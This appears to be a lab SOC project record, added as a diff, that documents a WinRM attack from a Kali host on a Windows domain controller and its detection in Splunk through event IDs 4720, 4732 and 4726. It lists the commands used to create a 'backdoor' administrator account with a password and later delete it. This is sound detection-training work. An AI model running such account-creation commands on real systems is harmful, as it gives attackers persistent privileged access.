@@ -1,0 +1,35 @@
+=== SOC PROJECT: ATTACK EVIDENCE ===
+
+## Attack Execution
+- Date: 2026-08-27
+- Time: 11:14:24
+- Attacker: Kali (192.168.1.10)
+- Target: Windows DC (192.168.1.5)
+- Method: WinRM
+
+## Commands Executed
+1. whoami → cyberlab\administrator
+2. hostname → DC01
+3. net user backdoor P@ssw0rd123!@ /add → SUCCESS
+4. net localgroup Administrators backdoor /add → SUCCESS
+5. net user backdoor → Verified (Member of Administrators)
+6. net user backdoor /delete → SUCCESS
+
+## Splunk Detection
+- Event ID: 4720
+- Description: User account created (backdoor)
+- Account: backdoor
+- Created by: Administrator
+- Time: 2026-08-27 11:14:24
+
+## Additional Events Detected
+- Event 4688: Process Creation (net.exe)
+- Event 4732: Member added to Administrators group
+- Event 4726: User account deleted (cleanup)
+
+## Incident Response Actions
+1. ✅ Detected account creation in Splunk
+2. ✅ Investigated the source (WinRM login)
+3. ✅ Verified backdoor account
+4. ✅ Cleaned up the account
+5. ✅ Documented the incident
